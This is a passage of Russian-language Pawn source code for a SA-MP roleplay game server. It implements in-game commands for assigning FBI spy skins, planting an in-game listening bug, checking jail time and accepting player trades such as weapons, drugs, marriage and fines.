            case 5: ShowPlayerDialogEx(playerid, 50+6, DIALOG_STYLE_LIST, "Меню", "[0] [skin:59]\n[1] [skin:240]\n[2] [skin:150]", "Выбрать", "Назад");
            case 6: ShowPlayerDialogEx(playerid, 50+7, DIALOG_STYLE_LIST, "Меню", "[0] [skin:188]\n[1] [skin:217]\n[2] [skin:250]\n[3] [skin:261]\n[4] [skin:148]\n[5] [skin:211]", "Выбрать", "Назад");
            case 7: ShowPlayerDialogEx(playerid, 50+8, DIALOG_STYLE_LIST, "Меню", "[0] [skin:124]\n[1] [skin:223]\n[2] [skin:113]\n[3] [skin:91]", "Выбрать", "Назад");
            case 8: ShowPlayerDialogEx(playerid, 50+9, DIALOG_STYLE_LIST, "Меню", "[0] [skin:123]\n[1] [skin:186]\n[2] [skin:120]\n[3] [skin:169]\n[4] [skin:117]\n[5] [skin:118]", "Выбрать", "Назад");
            case 9: ShowPlayerDialogEx(playerid, 50+10, DIALOG_STYLE_LIST, "Меню", "[0] [skin:272]\n[1] [skin:112]\n[2] [skin:125]\n[3] [skin:214]\n[4] [skin:111]", "Выбрать", "Назад");
            case 10: ShowPlayerDialogEx(playerid, 50+11, DIALOG_STYLE_LIST, "Меню", "[0] [skin:175]\n[1] [skin:174]\n[2] [skin:173]\n[3] [skin:226]", "Выбрать", "Назад");
            case 11: ShowPlayerDialogEx(playerid, 50+12, DIALOG_STYLE_LIST, "Меню", "[0] [skin:105]\n[1] [skin:106]\n[2] [skin:107]\n[3] [skin:269]\n[4] [skin:271]\n[5] [skin:270]\n[6] [skin:56]", "Выбрать", "Назад");
            case 12: ShowPlayerDialogEx(playerid, 50+13, DIALOG_STYLE_LIST, "Меню", "[0] [skin:102]\n[1] [skin:103]\n[2] [skin:104]\n[3] [skin:195]", "Выбрать", "Назад");
            case 13: ShowPlayerDialogEx(playerid, 50+17, DIALOG_STYLE_LIST, "Меню", "[0] [skin:108]\n[1] [skin:109]\n[2] [skin:110]\n[3] [skin:190]", "Выбрать", "Назад");
            case 14: ShowPlayerDialogEx(playerid, 50+15, DIALOG_STYLE_LIST, "Меню", "[0] [skin:114]\n[1] [skin:116]\n[2] [skin:115]\n[3] [skin:41]", "Выбрать", "Назад");
            case 15: ShowPlayerDialogEx(playerid, 50+16, DIALOG_STYLE_LIST, "Меню", "[0] [skin:100]\n[1] [skin:247]\n[2] [skin:248]\n[3] [skin:254]\n[4] [skin:246]\n[5] [skin:64]\n[6] [skin:131]\n[7] [skin:198]\n[8] [skin:181]", "Выбрать", "Назад");
		}
		return true;
    }
    if(!strcmp(act, "off", true))
    {
        format(string, sizeof(string), "/spy %i off", SmenaSkina);
        CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
		return true;
    }
    if(strcmp(act, "on", true) != 0)
    {
        return true;
    }
    if(PTEMP[playerid][pMember] != 2) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция!");
 	if(PTEMP[playerid][pRank] < 4) return SCM(playerid, COLOR_GREY, " Доступно с 4 ранга");
	new bool:label=false;
 	for(new i = 0; i < 5; i++)
	{
		if(spys[i][0] == -1)
		{
			label = true;
		}
	}
	if(!label) return SCM(playerid, COLOR_GREY, " Одновременно можно назначить не больше 5 шпионов!");
    switch(fracid)
    {
    case 0:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 79);
        case 1: SetPlayerSkin(SmenaSkina, 78);
        case 2: SetPlayerSkin(SmenaSkina, 137);
        case 3: SetPlayerSkin(SmenaSkina, 200);
        case 4: SetPlayerSkin(SmenaSkina, 230);
        case 5: SetPlayerSkin(SmenaSkina, 239);
        case 6: SetPlayerSkin(SmenaSkina, 212);
        case 7: SetPlayerSkin(SmenaSkina, 228);
        case 8: SetPlayerSkin(SmenaSkina, 142);
        case 9: SetPlayerSkin(SmenaSkina, 297);
        case 10: SetPlayerSkin(SmenaSkina, 292);
        case 11: SetPlayerSkin(SmenaSkina, 122);
        case 12: SetPlayerSkin(SmenaSkina, 193);
        case 13: SetPlayerSkin(SmenaSkina, 55);
        case 14: SetPlayerSkin(SmenaSkina, 90);
        case 15: SetPlayerSkin(SmenaSkina, 40);
        case 16: SetPlayerSkin(SmenaSkina, 233);
        case 17: SetPlayerSkin(SmenaSkina, 298);
        case 18: SetPlayerSkin(SmenaSkina, 93);
        default: return true;
        }
    }
    case 1:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 280);
        case 1: SetPlayerSkin(SmenaSkina, 281);
        case 2: SetPlayerSkin(SmenaSkina, 282);
        case 3: SetPlayerSkin(SmenaSkina, 283);
        case 4: SetPlayerSkin(SmenaSkina, 288);
        case 5: SetPlayerSkin(SmenaSkina, 284);
        case 6: SetPlayerSkin(SmenaSkina, 285);
        case 7: SetPlayerSkin(SmenaSkina, 76);
        case 8: SetPlayerSkin(SmenaSkina, 306);
        case 9: SetPlayerSkin(SmenaSkina, 307);
        case 10: SetPlayerSkin(SmenaSkina, 309);
        case 11: SetPlayerSkin(SmenaSkina, 265);
        case 12: SetPlayerSkin(SmenaSkina, 266);
        case 13: SetPlayerSkin(SmenaSkina, 267);
        case 14: SetPlayerSkin(SmenaSkina, 310);
        case 15: SetPlayerSkin(SmenaSkina, 311);
        case 16: SetPlayerSkin(SmenaSkina, 302);
        case 17: SetPlayerSkin(SmenaSkina, 303);
        case 18: SetPlayerSkin(SmenaSkina, 304);
        case 19: SetPlayerSkin(SmenaSkina, 305);
        default: return true;
        }
    }
    case 2:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 287);
        case 1: SetPlayerSkin(SmenaSkina, 191);
        case 2: SetPlayerSkin(SmenaSkina, 179);
        default: return true;
        }
    }
    case 3:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 274);
        case 1: SetPlayerSkin(SmenaSkina, 275);
        case 2: SetPlayerSkin(SmenaSkina, 276);
        case 3: SetPlayerSkin(SmenaSkina, 70);
        case 4: SetPlayerSkin(SmenaSkina, 219);
        case 5: SetPlayerSkin(SmenaSkina, 308);
        default: return true;
        }
    }
    case 4:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 57);
        case 1: SetPlayerSkin(SmenaSkina, 98);
        case 2: SetPlayerSkin(SmenaSkina, 147);
        case 3: SetPlayerSkin(SmenaSkina, 187);
        case 4: SetPlayerSkin(SmenaSkina, 216);
        default: return true;
        }
    }
    case 5:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 59);
        case 1: SetPlayerSkin(SmenaSkina, 240);
        case 2: SetPlayerSkin(SmenaSkina, 150);
        default: return true;
        }
    }
    case 6:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 188);
        case 1: SetPlayerSkin(SmenaSkina, 217);
        case 2: SetPlayerSkin(SmenaSkina, 250);
        case 3: SetPlayerSkin(SmenaSkina, 261);
        case 4: SetPlayerSkin(SmenaSkina, 148);
        case 5: SetPlayerSkin(SmenaSkina, 211);
        default: return true;
        }
    }
    case 7:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 124);
        case 1: SetPlayerSkin(SmenaSkina, 223);
        case 2: SetPlayerSkin(SmenaSkina, 113);
        case 3: SetPlayerSkin(SmenaSkina, 91);
        default: return true;
        }
    }
    case 8:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 123);
        case 1: SetPlayerSkin(SmenaSkina, 186);
        case 2: SetPlayerSkin(SmenaSkina, 120);
        case 3: SetPlayerSkin(SmenaSkina, 169);
        case 4: SetPlayerSkin(SmenaSkina, 117);
        case 5: SetPlayerSkin(SmenaSkina, 118);
        default: return true;
        }
    }
    case 9:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 272);
        case 1: SetPlayerSkin(SmenaSkina, 112);
        case 2: SetPlayerSkin(SmenaSkina, 125);
        case 3: SetPlayerSkin(SmenaSkina, 214);
        case 4: SetPlayerSkin(SmenaSkina, 111);
        default: return true;
        }
    }
    case 10:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 175);
        case 1: SetPlayerSkin(SmenaSkina, 174);
        case 2: SetPlayerSkin(SmenaSkina, 173);
        case 3: SetPlayerSkin(SmenaSkina, 226);
        default: return true;
        }
    }
    case 11:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 105);
        case 1: SetPlayerSkin(SmenaSkina, 106);
        case 2: SetPlayerSkin(SmenaSkina, 107);
        case 3: SetPlayerSkin(SmenaSkina, 269);
        case 4: SetPlayerSkin(SmenaSkina, 271);
        case 5: SetPlayerSkin(SmenaSkina, 270);
        case 6: SetPlayerSkin(SmenaSkina, 56);
        default: return true;
        }
    }
    case 12:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 102);
        case 1: SetPlayerSkin(SmenaSkina, 103);
        case 2: SetPlayerSkin(SmenaSkina, 104);
        case 3: SetPlayerSkin(SmenaSkina, 195);
        default: return true;
        }
    }
    case 13:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 108);
        case 1: SetPlayerSkin(SmenaSkina, 109);
        case 2: SetPlayerSkin(SmenaSkina, 110);
        case 3: SetPlayerSkin(SmenaSkina, 190);
        default: return true;
        }
    }
    case 14:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 114);
        case 1: SetPlayerSkin(SmenaSkina, 116);
        case 2: SetPlayerSkin(SmenaSkina, 115);
        case 3: SetPlayerSkin(SmenaSkina, 41);
        default: return true;
        }
    }
    case 15:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 100);
        case 1: SetPlayerSkin(SmenaSkina, 247);
        case 2: SetPlayerSkin(SmenaSkina, 248);
        case 3: SetPlayerSkin(SmenaSkina, 254);
        case 4: SetPlayerSkin(SmenaSkina, 246);
        case 5: SetPlayerSkin(SmenaSkina, 64);
        case 6: SetPlayerSkin(SmenaSkina, 131);
        case 7: SetPlayerSkin(SmenaSkina, 198);
        case 8: SetPlayerSkin(SmenaSkina, 181);
        default: return true;
        }
    }
    default: return true;
    }
    label=false;
    for(new i = 0; i < 5; i++)
	{
		if(spys[i][0] == SmenaSkina)
		{
		    label = true;
			spys[i][1] = fracid;
		    break;
		}
	}
	if(!label)
	{
        format(YCMDstr, 80, " %s назначил %s шпионом", PTEMP[playerid][pName], PTEMP[SmenaSkina][pName]);
		SendFamilyMessage(2, 0x00b953ff, YCMDstr);
		for(new i = 0; i < 5; i++)
		{
			if(spys[i][0] == -1)
			{
			    spys[i][0] = SmenaSkina;
			    spys[i][1] = fracid;
			    break;
			}
		}
	}
	return true;
}
CMD:tjail(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(PTEMP[playerid][pAdmin] < 1) return true;
	if(dostup[playerid] != 1) return true;
	if(sscanf(params, "u", params[0])) return SCM(playerid, -1, " Введите: /tjail [playerid]");
	if(!IsPlayerConnected(params[0]) || params[0] == INVALID_PLAYER_ID) return SCM(playerid, COLOR_GREY, " Игрок не найден");
	if(PTEMP[params[0]][pJailTime] == 0) SCM(playerid, COLOR_GREY, " Игрок не находится в камере");
	format(YCMDstr, 42, " Игрок выйдет из тюрьмы через %i секунд", PTEMP[params[0]][pJailTime]-1);
	SCM(playerid, -1, YCMDstr);
	return true;
}
CMD:atipster(playerid, params[])
{
	if(dostup[playerid] != 1) return true;
	if(PTEMP[playerid][pAdmin] < 1) return 1;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /atipster [ид фракции] 0 - отключить");
	if(params[0] > 33 || params[0] < 0) return SCM(playerid, COLOR_GREY, " Нельзя меньше 0 или больше 33");
	SetPVarInt(playerid,"Atisper",params[0]);
	if(params[0] == 0) SCM(playerid, -1, " Прослушка активирована. Используйте ид фракции 0 для отключения");
	else SCM(playerid, -1, " Прослушка активирована. Используйте ид фракции 0 для отключения");
	return 1;
}
CMD:tipster(playerid, params[])
{
	new param[40];
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pMember] != 2)return SCM(playerid, COLOR_GREY, " Вы не агент FBI");
	if(sscanf( params, "s[32]S()[64]", param, params ))
	{
		SCM(playerid, -1, " Введите: /tipster {FFFF00}get {FFFFFF}или {FFFF00}set {FFFFFF}или {FFFF00}remove {FFFFFF}или {FFFF00}listen");
		return true;
	}
	if(!strcmp(param, "get",true))
	{
		new bool:label=false;
		for(new i = 0; i < 5; i++)
		{
		    if(spys[i][0] == playerid)
		    {
		        label = true;
		    }
		}
		if(!label) return SCM(playerid, COLOR_GREY, " Вы не шпион");
		if(GetPlayerVehicleID(playerid) >= fbicar[0] && GetPlayerVehicleID(playerid) <= fbicar[16]) {}
		else return SCM(playerid,COLOR_GREY," Вы должны находиться в автомобиле FBI");
		if(tipster != -1) return SCM(playerid,COLOR_GREY," Жучок используется другим шпионом");
		tipster = playerid;
		format(YCMDstr,sizeof(YCMDstr)," %s взял(а) жучок",Name(playerid));
		SendRadioMessage(2,0x00b953ff, YCMDstr);
	}
	else if(!strcmp(param, "set",true))
	{
		new ammo;
		if(sscanf( params, "u", ammo ) ) return SCM(playerid, -1, " Введите: /tipster SET [playerid]");
		if(tipster != playerid) return SCM(playerid,COLOR_GREY," У вас нет жучка");
		if(!ProxDetectorS(3.0, playerid, ammo)) return SCM(playerid,COLOR_GREY," Человек должен находиться от 3ёх метрах от вас");
	//	if(tipsteron != -1) return SCM(playerid,COLOR_ISPOLZUY," жучок уже прикреплен! Используйте /tipster REMOVE");
		if(!PTEMP[ammo][pMember]) return SCM(playerid,COLOR_GREY," Игрок не состоит в организации");
		tipsteron = PTEMP[ammo][pMember];
		tipsterplayer = ammo;
		format(YCMDstr,sizeof(YCMDstr)," %s установил жучок на %s. Чтобы подключиться к волне, введите /tipster listen",Name(playerid),Name(ammo));
		SendRadioMessage(2,0x00b953ff, YCMDstr);
	}
	else if(!strcmp(param, "remove",true))
	{
		if(tipster == -1) return SCM(playerid,COLOR_GREY," Жучок не прикреплен!");
		tipster = -1;
		tipsteron = -1;
		tipsterplayer = -1;
		format(YCMDstr,sizeof(YCMDstr)," %s деактивировал жучок",Name(playerid));
		SendRadioMessage(2,0x00b953ff, YCMDstr);
	}
	else if(!strcmp(param, "listen",true))
	{
		if(tipsteron == -1) return SCM(playerid,COLOR_GREY," Жучок не прикреплен!");
		if(!tipsterlisten[playerid])
		{
			tipsterlisten[playerid] = 1;
			SCM(playerid,0x00b953ff," Вы начали прослушивание!");
		}
		else
		{
			tipsterlisten[playerid] = 0;
			SCM(playerid,0x00b953ff," Вы закончили прослушивание!");
		}
	}
	return true;
}
CMD:cancel(playerid, params[])
{
	if(!PTEMP[playerid][pLogin]) return true;
	return ShowPlayerDialogEx(playerid,1757,DIALOG_STYLE_LIST,"Отменить","Нарко (/selldrugs)\nРемонт (/repair)\nЗаправка (/refill)\nИнтервью\nВызов полиции\nВызов медика\nВызов механика\nВызов такси\nОбмен транспортом (/changecar)\nАвтоугон\nОтмена ставки", "Готово", "Отмена");
}
//#11
CMD:accept(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new sendername[MAX_PLAYER_NAME],giveplayer[MAX_PLAYER_NAME];
	new x_job[64];
	
	new strs[32];
	format(string, sizeof(string), "");
	if(GetPVarInt(playerid,"Sell_Gun") > 0)// покупка оружия
	{
		format(strs, sizeof(strs), "Купить оружие\n");
		strcat(string, strs);
	}
	if(KrishaOffer[playerid] != 999)
	{
	    format(strs, sizeof(strs), "Крыша\n");
		strcat(string, strs);
	}
	if(ProposeOffer[playerid] != 999)
	{
	    format(strs, sizeof(strs), "Свадьба\n");
		strcat(string, strs);
	}
	if(JobOffer[playerid] != 999)
	{
	    format(strs, sizeof(strs), "Контракт\n");
		strcat(string, strs);
	}
	if(TicketOffer[playerid] != 999)
	{
	    format(strs, sizeof(strs), "Штраф\n");
		strcat(string, strs);
	}
	if(DrugOffer[playerid] != 999)
	{
	    format(strs, sizeof(strs), "Наркотики\n");
		strcat(string, strs);
	}
	if(BoyOffer[playerid] != 999)
	{
	    format(strs, sizeof(strs), "Бой\n");
		strcat(string, strs);
	}
	if(GetPVarInt(playerid,"_changehouse"))
	{
	    format(strs, sizeof(strs), "Покупка дома\n");
		strcat(string, strs);
	}
	if(RefillOffer[playerid] != 999)
	{
	    format(strs, sizeof(strs), "Заправка\n");
		strcat(string, strs);
	}
	if(RepairOffer[playerid] != 999)
	{
	    format(strs, sizeof(strs), "Починка\n");
		strcat(string, strs);
	}
	if(ZoneOffer[playerid] != 999)
	{
	    format(strs, sizeof(strs), "Территории\n");
		strcat(string, strs);
	}
	if(KeysOffer[playerid] != 999)
	{
		format(strs, sizeof(strs), "Ключи от камеры\n");
		strcat(string, strs);
	}
	if(GetPVarInt(playerid,"h_id"))
	{
	    format(strs, sizeof(strs), "Хот Дог\n");
		strcat(string, strs);
	}
	if(FreeOffer[playerid] != 999)
	{
	    format(strs, sizeof(strs), "Выход из тюрьмы\n");
		strcat(string, strs);
	}
	if(strlen(string) == 0) return SCM(playerid, COLOR_GREY, " Нет ни одного предложения");
	if(sscanf(params, "s[32]",x_job)) return ShowPlayerDialogEx(playerid, 13954, DIALOG_STYLE_LIST, "Предложения", string, "Подтвердить", "Назад");
	if(strcmp(x_job,"gun",true) == 0)
	{
		if(GetPVarInt(playerid,"Sell_Gun") <= 0) return SCM(playerid,COLOR_GREY," Вам не предлагали купить оружие!");
		if(!ProxDetectorS(4.0, playerid, GetPVarInt(playerid,"Sell_GunId"))) return SCM(playerid, COLOR_GREY," Игрок слишком далеко!");
		if(PTEMP[playerid][pCash] < GetPVarInt(playerid,"Sell_GunPrice")) return SCM(playerid,COLOR_GRAD1, " У вас недостаточно денег");
		PTEMP[playerid][pCash]-=GetPVarInt(playerid,"Sell_GunPrice");
		PTEMP[GetPVarInt(playerid,"Sell_GunId")][pCash]+=GetPVarInt(playerid,"Sell_GunPrice");
		PTEMP[GetPVarInt(playerid,"Sell_GunId")][pMats]-=GetPVarInt(playerid,"Sell_GunMats");
		if(booston == 0) GiveWeapon(playerid,GetPVarInt(playerid,"Sell_Gun"),GetPVarInt(playerid,"Sell_GunAmmo"));
		else if(booston == 1) GiveWeapon(playerid,GetPVarInt(playerid,"Sell_Gun"),GetPVarInt(playerid,"Sell_GunAmmo")*3);
		format(string, 128, " %s сделал оружие из материалов %s",Name(GetPVarInt(playerid,"Sell_GunId")),Name(playerid));
		ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		DeletePVar(playerid,"Sell_Gun");
		DeletePVar(playerid,"Sell_GunAmmo");
		DeletePVar(playerid,"Sell_GunPrice");
		DeletePVar(playerid,"Sell_GunMats");
		if(GetPVarInt(playerid, "Hour_Gun") == 0 && !IsAGang(playerid))
		{
			SetPVarInt(playerid,"Hour_Gun", 1);
            SetTimerEx("GunTimer" , 3600000, false, "i", playerid);
            PTEMP[GetPVarInt(playerid, "Sell_GunId")][pGRating] += 100;
            switch(PTEMP[GetPVarInt(playerid, "Sell_GunId")][pMember])
            {
                case 12: gRating[Ballas] += 100;
                case 13: gRating[Vagos]  += 100;
                case 15: gRating[Grove]  += 100;
                case 17: gRating[Aztec]  += 100;
                case 18: gRating[Rifa]   += 100;
            }
		}
		DeletePVar(playerid,"Sell_GunId");
		return true;
	}
	else if(strcmp(x_job, "ekey",true) == 0)
	{
		if(KeysOffer[playerid] < 999)
		{
			GetPlayerName(KeysOffer[playerid], giveplayer, sizeof(giveplayer));
			GetPlayerName(playerid, sendername, sizeof(sendername));
			if(PTEMP[playerid][pCash] < KeysPrice[playerid]) return SCM(playerid, COLOR_GREY, " У вас нет столько денег!");
			if(PTEMP[playerid][pKeys] >= 5) return SCM(playerid, COLOR_GREY, " У вас уже есть 5 ключей!");
			PTEMP[playerid][pKeys] += KeysGram[playerid];
			PTEMP[KeysOffer[playerid]][pKeys] -= KeysGram[playerid];
			PTEMP[playerid][pCash] -= KeysPrice[playerid];
			format(string, 128, " Вы купили у %s %i ключей за %i вирт", giveplayer, KeysGram[playerid], KeysPrice[playerid]);
			SCM(playerid, 0x6495EDFF, string);
			format(string, 128, " %s купил у вас %i ключей за %i вирт", sendername, KeysGram[playerid], KeysPrice[playerid]);
			SCM(KeysOffer[playerid], 0x6495EDFF, string);
			format(string, 20, "~r~-$%i",KeysPrice[playerid]);
			GameTextForPlayer(playerid, string, 5000, 1);
			format(string, 20, "~g~+$%i",KeysPrice[playerid]);
			GameTextForPlayer(KeysOffer[playerid], string, 5000, 1);
			KeysOffer[playerid] = 999;
			return true;
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Нет такого предложения");
			return true;
		}
	}
	else if(strcmp(x_job, "debt",true) == 0)
	{
		if(KrishaOffer[playerid] < 999)
		{
			GetPlayerName(KrishaOffer[playerid], giveplayer, sizeof(giveplayer));
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, 128, " Вы приняли крышу от %s'a", giveplayer);
			SCM(playerid, 0x6495EDFF, string);
			format(string, 128, " %s согласился на вашу крышу", sendername);
			SCM(KrishaOffer[playerid], 0x6495EDFF, string);
			KrishaOffer[playerid] = 999;
			PTEMP[playerid][pUseKrisha] = 1;
			PTEMP[playerid][pKrisha] = Krisha[playerid];
			return true;
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вам ни кто не предлагал крышу");
			return true;
		}
	}
	else if(strcmp(x_job, "propose",true) == 0)
	{
		if(ProposeOffer[playerid] < 999)
		{
			if(!PlayerToPoint(10.0, playerid, -1988.6638,1117.8837,54.4726)) return SCM(playerid, COLOR_GREY, " Вы не у церкви в San Fierro!");
			if(IsPlayerConnected(ProposeOffer[playerid]))
			{
				if(ProxDetectorS(10.0, playerid, ProposeOffer[playerid]))
				{
					GetPlayerName(ProposeOffer[playerid], giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					format(string, 128, " Вы приняли предложение от %s's", giveplayer);
					SCM(playerid, 0x6495EDFF, string);
					format(string, 128, " %s приняла Ваш запрос быть Вашей Женой.", sendername);
					SCM(ProposeOffer[playerid], 0x6495EDFF, string);
					strmid (PTEMP[playerid][pMarriedTo],giveplayer, 0, strlen(giveplayer), 32);
					strmid (PTEMP[ProposeOffer[playerid]][pMarriedTo],sendername, 0, strlen(sendername), 32);
					PTEMP[ProposeOffer[playerid]][pCash] -= 100000;
					ProposedTo[playerid] = 999;
					ProposeOffer[playerid] = 999;
				}
				return true;
			}
			else
			{
				SCM(playerid, COLOR_GREY, "Жених/Невеста не рядом с Вам!");
				return true;
			}
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вам ни кто не предлагал!");
			return true;
		}
	}
	else if(strcmp(x_job, "gcontract",true) == 0)
	{
		if(JobOffer[playerid] == 999) return SCM(playerid, COLOR_GREY, " Вам никто не предлогал контракт");
		if(Employer[playerid] != 999) return SCM(playerid, COLOR_GREY, " Вы уже заключили контракт");
		if(Prorab[JobOffer[playerid]] == false) return SCM(playerid,COLOR_GREY, " Ошибка. Прораб уже не на работе");
		if(!IsPlayerInRangeOfPoint(playerid,10.0,2127.5701,-2275.1938,20.6719)) SCM(playerid,-1, " Ошибка. Вы должны быть у раздевалки");
		if(!IsPlayerConnected(JobOffer[playerid])) return SCM(playerid,-1, " Игрок не в стеи");
		if(!ProxDetectorS(5.0, playerid, JobOffer[playerid])) return SCM(playerid,-1, " Ошибка. Вы должны находиться рядом с игроком");
		GetPlayerName(JobOffer[playerid], giveplayer, sizeof(giveplayer));
		GetPlayerName(playerid, sendername, sizeof(sendername));
		Employer[playerid] = JobOffer[playerid];
		JobOffer[playerid] = 999;
		format(string, 128, " Вы приняли предложение %s", giveplayer);
		SCM(playerid, 0x6495EDFF, string);
		format(string, 128, " %s принял ваше предложение.", sendername);
		SCM(Employer[playerid], 0x6495EDFF, string);
		SCM(Employer[playerid], 0x6495EDFF, "(( /gpayday - выдать зарплату ))");
		
	}
	else if(strcmp(x_job, "ticket",true) == 0)
	{
		if(TicketOffer[playerid] < 999)
		{
			if(IsPlayerConnected(TicketOffer[playerid]))
			{
				if (ProxDetectorS(5.0, playerid, TicketOffer[playerid]))
				{
					GetPlayerName(TicketOffer[playerid], giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					format(string, 128, " Вы оплатили штраф в размере %i вирт офицеру %s.", TicketMoney[playerid], giveplayer);
					SCM(playerid, COLOR_BLUE, string);
					format(string, 128, " %s оплатил штраф в размере %i вирт.", sendername, TicketMoney[playerid]);
					SCM(TicketOffer[playerid], COLOR_BLUE, string);
					PTEMP[playerid][pCash] -=TicketMoney[playerid];
					PTEMP[TicketOffer[playerid]][pCash] +=TicketMoney[playerid];
					TicketOffer[playerid] = 999;
					TicketMoney[playerid] = 0;
					return true;
				}
				else
				{
					SCM(playerid, COLOR_GREY, "Полицейскйи не рядом с вами!");
					return true;
				}
			}
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вам не выписывали штраф!");
			return true;
		}
	}
	else if(strcmp(x_job, "drugs",true) == 0)
	{
		if(DrugOffer[playerid] < 999)
		{
			if(PTEMP[playerid][pCash] > DrugPrice[playerid])
			{
				if(PTEMP[playerid][pDrugs] <= (150 - DrugGram[playerid]))
				{
					if(IsPlayerConnected(DrugOffer[playerid]))
					{
						GetPlayerName(DrugOffer[playerid], giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, " Вы купили %i грамм наркотиков за %i вирт у %s.",DrugGram[playerid],DrugPrice[playerid],giveplayer);
						SCM(playerid, 0x6495EDFF, string);
						format(string, 128, " %s купил у вас %i грамм наркотиков за %i вирт",sendername,DrugGram[playerid],DrugPrice[playerid]);
						SCM(DrugOffer[playerid], 0x6495EDFF, string);
						PTEMP[playerid][pCash] -=DrugPrice[playerid];
						GiveMoney(DrugOffer[playerid], DrugPrice[playerid]);
						PTEMP[playerid][pDrugs] += DrugGram[playerid];
						PTEMP[DrugOffer[playerid]][pDrugs] -= DrugGram[playerid];
						if(GetPVarInt(playerid, "Hour_Drugs") == 0 && !IsAGang(playerid))
						{
							SetPVarInt(playerid,"Hour_Drugs", 1);
				            SetTimerEx("DrugsTimer" , 3600000, false, "i", playerid);
				            PTEMP[DrugOffer[playerid]][pGRating] += 100;
				            switch(PTEMP[DrugOffer[playerid]][pMember])
				            {
				                case 12: gRating[Ballas] += 100;
				                case 13: gRating[Vagos]  += 100;
				                case 15: gRating[Grove]  += 100;
				                case 17: gRating[Aztec]  += 100;
				                case 18: gRating[Rifa]   += 100;
				            }
						}
						DrugOffer[playerid] = 999;
						return true;
					}
					return true;
				}
				else
				{
					SCM(playerid, COLOR_GREY, " У Вас и так достаточно наркотиков!");
					return true;
				}
			}
			else
			{
				SCM(playerid, COLOR_GREY, " У вас нет столько денег!");
				return true;
			}
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вам никто не предлагал купить наркотики!");
			return true;
		}
	}
	else if(strcmp(x_job, "fight",true) == 0)
	{
		new i = BoyOffer[playerid];
		new ccount = 0;
		foreach(q)
		{
			if(PTEMP[q][pJob] == 6 || PTEMP[q][pLogin] != 0) ccount++;
			if(ccount == 0)
			{
				if(BoyOffer[playerid] == 999) return SCM(playerid,COLOR_GREY," Вам никто не предлагал драться");
				if(training[playerid] == 0) return SCM(playerid,COLOR_GREY," Вы должны переодеться в раздевалке");
				if(boyidet != false) return SCM(playerid,COLOR_GREY," Подождите! На ринге уже идет бой");
				SetPlayerInterior(playerid,5);
				SetPlayerPos(playerid,762.7874,2.2635,1001.5942);
				SetPlayerFacingAngle(playerid, 133.9088);
				//===========================================//
				SetPlayerInterior(playerid,5);
				SetPlayerPos(i,758.7249,-1.9224,1001.5942);
				SetPlayerFacingAngle(playerid, 316.2242);
				if(training[playerid] == 2) training[playerid] = 1337;
				if(training[i] == 2) training[i] = 1337;
				else if(training[playerid] == 4) training[playerid] = 1338;
				else if(training[i] == 4) training[i] = 1338;
				else if(training[playerid] == 6) training[playerid] = 1339;
				else if(training[i] == 6) training[i] = 1339;
				TogglePlayerControllable(playerid, 0);
				SetTimerEx("UnFreeze" , 2000, false, "i", playerid);
				TogglePlayerControllable(i, 0);
				SetTimerEx("UnFreeze" , 2000, false, "i", i);
				boyidet = true;
				GameTextForPlayer(playerid, "~r~FIGHT", 2500, 3);
				GameTextForPlayer(i, "~r~FIGHT", 2500, 3);
				BoyOffer[playerid] = 999;
			}
			else
			{
				new Float:XX,Float:YY,Float:ZZ;
				GetPlayerPos(q,XX,YY,ZZ);
				if(IsPlayerInRangeOfPoint(playerid, 10, XX,YY,ZZ))
				{
					if(PTEMP[q][pJob] == 6 || PTEMP[q][pLogin] != 0) SetPVarInt(q,"startfight",playerid);
					if(PTEMP[q][pJob] == 6 || PTEMP[q][pLogin] != 0) SetPVarInt(q,"startfighter",i);
					if(PTEMP[q][pJob] == 6 || PTEMP[q][pLogin] != 0) SendMes(q,COLOR_BLUE," %s и %s хотят провести бой. {FFFFFF}(( /startfight - чтобы начать бой ))",Name(playerid),Name(i));
					SCM(playerid,-1," Подождите пока тренер устроит вам поединок");
				}
			}
		}
	}
	else if(strcmp(x_job, "house",true) == 0)
	{
		/*if(GetPVarInt(playerid,"changehouse"))
		{
			new i = GetPVarInt(playerid,"changehouse")-1;
